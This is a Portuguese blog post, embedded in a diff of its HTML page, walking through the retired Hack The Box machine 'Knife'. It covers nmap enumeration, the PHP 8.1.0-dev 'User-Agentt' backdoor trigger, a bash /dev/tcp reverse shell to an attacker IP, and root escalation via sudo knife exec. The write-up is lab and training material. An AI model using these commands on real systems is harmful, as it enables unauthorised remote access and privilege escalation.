@@ -1,0 +1,1064 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <!-- start custom head snippets -->
+<!-- Begin Jekyll GTM tag v1.0.3 -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-MF4PLJ5');</script>
+<!-- End Jekyll GTM tag v1.0.3 -->
+
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<link rel="shortcut icon" href="/assets/images/favicon.ico" />
+
+<!-- Multilang tags -->
+
+    
+<link rel="alternate" hreflang="pt-BR" href="https://davicruz.com/walkthrough/2021/08/htb-knife">
+<link rel="alternate" hreflang="x-default" href="https://davicruz.com/walkthrough/2021/08/htb-knife">
+    
+
+    
+<link rel="alternate" hreflang="en-US" href="https://davicruz.com/en-US/walkthrough/2021/08/htb-knife">
+        
+<link rel="alternate" hreflang="en" href="https://davicruz.com/en-US/walkthrough/2021/08/htb-knife">
+        
+    
+
+
+<!-- end custom head snippets -->
+
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Walktrough: HTB Knife | Davi Cruz</title>
+<meta name="description" content="Olá!  A máquina desta semana será Knife, outra máquina Linux classificada como fácil do Hack The Box, criada por MrKN16H.">
+
+
+  <meta name="author" content="Davi Cruz">
+  
+  <meta property="article:author" content="Davi Cruz">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Davi Cruz">
+<meta property="og:title" content="Walktrough: HTB Knife">
+<meta property="og:url" content="https://davicruz.com/walkthrough/2021/08/htb-knife">
+
+
+  <meta property="og:description" content="Olá!  A máquina desta semana será Knife, outra máquina Linux classificada como fácil do Hack The Box, criada por MrKN16H.">
+
+
+
+  <meta property="og:image" content="https://i.imgur.com/U5A7c9y.png">
+
+
+
+  <meta name="twitter:site" content="@zerahzurc">
+  <meta name="twitter:title" content="Walktrough: HTB Knife">
+  <meta name="twitter:description" content="Olá!  A máquina desta semana será Knife, outra máquina Linux classificada como fácil do Hack The Box, criada por MrKN16H.">
+  <meta name="twitter:url" content="https://davicruz.com/walkthrough/2021/08/htb-knife">
+
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://i.imgur.com/U5A7c9y.png">
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2021-08-28T09:00:00-03:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://davicruz.com/walkthrough/2021/08/htb-knife">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Davi Cruz",
+      "url": "https://davicruz.com/",
+      "sameAs": ["https://twitter.com/zerahzurc","https://www.linkedin.com/in/davicruz","https://github.com/davi-cruz"]
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="hrWV-PqvbpxEy2HdpVYFQNws2Sz_tROleVyF18s2kWA" />
+
+
+  <meta name="msvalidate.01" content="60B1FA6CDAF15D226AB529AF30386BD8">
+
+
+
+  <meta name="yandex-verification" content="08de8d8c0326420f">
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Davi Cruz Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+  </head>
+
+  <body class="layout--single wide">
+    <!-- Begin Jekyll GTM tag v1.0.3 (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MF4PLJ5" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Jekyll GTM tag v1.0.3 (noscript) -->
+
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Pular para navegação primária</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Pular para conteúdo</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Pular para rodapé</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <!-- CUSTOM: Edit to adjust links to localized page -->
+        
+        
+          <a class="site-logo" href="/"><img src="/assets/images/logo.png" alt="Davi Cruz"></a>
+        
+        <a class="site-title" href="/">
+          Davi Cruz
+          
+        </a>
+        
+        <!-- END CUSTOM: Edit to adjust links to localized page -->
+        <ul class="visible-links">
+          <!-- CUSTOM: Edit to get localized navigation --><li class="masthead__menu-item">
+              <a href="/categorias/">Categorias</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/sobre/">Sobre</a>
+            </li>
+<!-- END CUSTOM: Edit to get localized navigation -->
+        </ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Chavear busca</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Chavear menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="https://davicruz.com/">
+        <img src="/assets/images/bio-photo.jpg" alt="Davi Cruz" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="https://davicruz.com/" itemprop="url">Davi Cruz</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Just another Cybersecurity professional</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Siga</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">São Paulo, BR</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://linkedin.com/in/davicruz" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fab fa-linkedin" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Walktrough: HTB Knife">
+    <meta itemprop="description" content="Olá!A máquina desta semana será Knife, outra máquina Linux classificada como fácil do Hack The Box, criada por MrKN16H.">
+    <meta itemprop="datePublished" content="2021-08-28T09:00:00-03:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="https://davicruz.com/walkthrough/2021/08/htb-knife" class="u-url" itemprop="url">Walktrough: HTB Knife
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-08-28T09:00:00-03:00">August 28, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minuto(s) de leitura
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    
+    
+    <span class="page__meta-lang"><a href="/en-US/walkthrough/2021/08/htb-knife">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Compartilhar</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+        <p>Olá!</p>
+
+<p>A máquina desta semana será <strong>Knife</strong>, outra máquina Linux classificada como fácil do <a href="https://www.hackthebox.eu/">Hack The Box</a>, criada por <a href="https://app.hackthebox.eu/users/98767">MrKN16H</a>.<!--more--></p>
+
+<p class="notice--info"><img class="emoji" title=":information_source:" alt=":information_source:" src="https://github.githubassets.com/images/icons/emoji/unicode/2139.png" height="20" width="20"> <strong>Info</strong>: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.</p>
+
+<p><img src="https://i.imgur.com/3IO9vBj.png" alt="HTB Knife" class="align-center"></p>
+
+<p>Esta máquina foi bem simples, onde você deve prestar atenção aos detalhes (no caso do webserver vulnerável) e sempre ir pelo caminho mais simples como abusar das permissões de <code class="language-plaintext highlighter-rouge">sudo</code> que o usuário já possui.</p>
+
+<p>Espero que gostem!</p>
+
+<h2 id="enumeração">Enumeração</h2>
+
+<p>Como de costume, iniciei com um scan rápido do <code class="language-plaintext highlighter-rouge">nmap</code> para verificar os serviços publicados nesta máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.242
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-10 17:50 <span class="nt">-03</span>
+Nmap scan report <span class="k">for </span>10.10.10.242
+Host is up <span class="o">(</span>0.072s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title:  Emergent Medical Idea
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>10.42 seconds
+</code></pre></div></div>
+
+<h3 id="80tcp---serviço-http">80/TCP - Serviço HTTP</h3>
+
+<p>Acessando o website podemos ver uma simples página institucional de uma companhia do setor de saúde, conforme abaixo:</p>
+
+<p><img src="https://i.imgur.com/oAbssxJ.png" alt="HTB Knife - HTTP Service" class="align-center"></p>
+
+<p>Após acessar a página, obtido algumas informações adicionais, os componentes utilizados e qual o webserver em execução com ajuda do <code class="language-plaintext highlighter-rouge">whatweb</code> e o que chamou a atenção foi o cabeçalho <code class="language-plaintext highlighter-rouge">X-Powered-By</code> que aponta para uma versão de desenvolvimento do <strong>PHP 8.1.0</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb <span class="nt">--color</span><span class="o">=</span>never <span class="nt">-a</span> 3 10.10.10.242 | <span class="nb">tee </span>whatweb.txt
+http://10.10.10.242 <span class="o">[</span>200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.242], PHP[8.1.0-dev], , Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
+</code></pre></div></div>
+
+<h2 id="acesso-inicial-e-user-flag">Acesso inicial e User flag</h2>
+
+<p>Como versões de desenvolvimento frequentemente contém vulnerabilidades, decidi buscar a respeito da mesma com <code class="language-plaintext highlighter-rouge">searchsploit</code> e encontrei uma vulnerabilidade de execução remota de código (RCE - <em>Remote Code Execution</em>) conforme listado abaixo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit <span class="s2">"8.1.0-dev"</span>
+<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
+ Exploit Title                                                        |  Path
+<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
+PHP 8.1.0-dev - <span class="s1">'User-Agentt'</span> Remote Code Execution                   | php/webapps/49933.py
+<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div>
+
+<p>Esta vulnerabilidade consiste em um backdoor adicionado em alguns commits por contas comprometidas no código fonte do PHP onde, sempre que um request contém o cabeçalho <code class="language-plaintext highlighter-rouge">User-Agentt: "zerodiumsystem('cmd');"</code> é enviado, seu conteúdo é interpretado e executado, neste caso o conteúdo <code class="language-plaintext highlighter-rouge">cmd</code>. O exploit disponível simula um shell de modo não interativo e, a partir dele, iniciei um shell reverso interativo com o payload <code class="language-plaintext highlighter-rouge">bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/4443 0&gt;&amp;1'</code> que nos retornou uma sessão a partir da conta do usuário <strong>james</strong>, onde encontramos o arquivo <code class="language-plaintext highlighter-rouge">user.txt</code> e foi possível ler seu conteúdo, obtendo a primeira flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:~<span class="nv">$ </span><span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span>
+knife
+james@knife:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+&lt;redacted&gt;
+</code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<p>Como de costume, iniciei com o comando <code class="language-plaintext highlighter-rouge">sudo -l</code> e tive sorte mais uma vez, vendo o seguinte output:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>james on knife:
+   env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User james may run the following commands on knife:
+   <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/knife              
+</code></pre></div></div>
+
+<p>Realizando uma busca rápida a respeito do binário, encontrei que se trata de parte da solução de gestão de configuração <a href="https://www.chef.io/">Chef</a> e, de acordo com a página <a href="https://gtfobins.github.io/gtfobins/knife/#sudo">knife | GTFOBins</a>, poderia ser utilizada facilmente para escalar privilégio como root, conforme abaixo, nos permitindo obter a última flag <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20"></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/knife <span class="nt">--help</span>                                                                                 Chef Infra Client: 16.10.8
+
+Docs: https://docs.chef.io/workstation/knife/
+Patents: https://www.chef.io/patents
+
+<span class="o">[</span>...]
+
+james@knife:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/knife <span class="nb">exec</span> <span class="nt">-E</span> <span class="s1">'exec "/bin/sh"'</span>
+<span class="c"># cat root.txt</span>
+&lt;redacted&gt;
+</code></pre></div></div>
+
+<p>Espero que tenham gostado!</p>
+
+<p>Vejo vocês no próximo post <img class="emoji" title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#hackthebox" class="page__taxonomy-item p-category" rel="tag">HackTheBox</a><span class="sep">, </span>
+    
+      <a href="/tags/#htb-easy" class="page__taxonomy-item p-category" rel="tag">HTB Easy</a><span class="sep">, </span>
+    
+      <a href="/tags/#htb-linux" class="page__taxonomy-item p-category" rel="tag">HTB Linux</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categorias: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categorias/#walkthrough" class="page__taxonomy-item p-category" rel="tag">Walkthrough</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Atualizado em:</strong> <time class="dt-published" datetime="2021-08-28T09:00:00-03:00">August 28, 2021</time></p>
+
+      </footer>
+
+      <section class="page__share" id="sharelinks">
+  
+    <h4 class="page__share-title">Compartilhe</h4>
+  
+
+  <!-- CUSTOM: Localized sharing links -->
+  
+
+  <a href="https://twitter.com/intent/tweet?via=zerahzurc&amp;text=Walktrough%3A+HTB+Knife%20https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F08%2Fhtb-knife" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F08%2Fhtb-knife" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F08%2Fhtb-knife" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+
+  <a href="whatsapp://send?text=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F08%2Fhtb-knife" data-action="share/whatsapp/share" class="btn btn--whatsapp" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Whatsapp"><i class="fab fa-fw fa-whatsapp" aria-hidden="true"></i><span> Whatsapp</span></a>
+
+  <a href="https://telegram.me/share/url?url=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F08%2Fhtb-knife&amp;text=Walktrough%3A+HTB+Knife" class="btn btn--telegram" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Telegram"><i class="fab fa-fw fa-telegram-plane" aria-hidden="true"></i><span> Telegram</span></a>
+
+  <!-- END CUSTOM: Localized sharing links -->
+</section>
+
+
+      
+  <nav class="pagination">
+    
+    
+      <a href="/walkthrough/2021/07/htb-thenotebook" class="pagination--pager" title="Walktrough: HTB TheNotebook
+">Anterior</a>
+    
+    
+    
+      
+        <a href="/walkthrough/2021/09/htb-schooled" class="pagination--pager" title="Walktrough: HTB Schooled
+">Próxima</a>
+      
+    
+  </nav>
+
+    </div>
+
+    
+      <div class="page__comments">
+  
+  
+      <h4 class="page__comments-title">Deixe um comentário</h4>
+      <section id="utterances-comments"></section>
+    
+</div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">Talvez você também goste</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/TJKS5F6.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+      
+        <a href="/walkthrough/2021/10/htb-explore" rel="permalink">Walktrough: HTB Explore
+</a>
+      
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-10-30T13:00:00-03:00">October 30, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minuto(s) de leitura
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    
+    
+    <span class="page__meta-lang"><a href="/en-US/walkthrough/2021/08/htb-knife">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Compartilhar</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Explore, uma máquina Android classificada como fácil do Hack The Box, criada por bertolis.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/89b1SdH.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+      
+        <a href="/walkthrough/2021/10/htb-dynstr" rel="permalink">Walktrough: HTB Dynstr
+</a>
+      
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-10-16T13:00:00-03:00">October 16, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          10 minuto(s) de leitura
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    
+    
+    <span class="page__meta-lang"><a href="/en-US/walkthrough/2021/08/htb-knife">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Compartilhar</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Dynstr, outra máquina Linux classificada como mediana do Hack The Box, criada por jkr.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/JkBtXmO.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+      
+        <a href="/walkthrough/2021/10/htb-cap" rel="permalink">Walktrough: HTB Cap
+</a>
+      
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-10-02T13:00:00-03:00">October 2, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          6 minuto(s) de leitura
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    
+    
+    <span class="page__meta-lang"><a href="/en-US/walkthrough/2021/08/htb-knife">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Compartilhar</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Cap, outra máquina Linux classificada como fácil do Hack The Box, criada por  InfoSecJack.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/pUqq7fY.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+      
+        <a href="/walkthrough/2021/09/htb-pit" rel="permalink">Walktrough: HTB Pit
+</a>
+      
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-09-25T09:00:00-03:00">September 25, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          11 minuto(s) de leitura
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    
+    
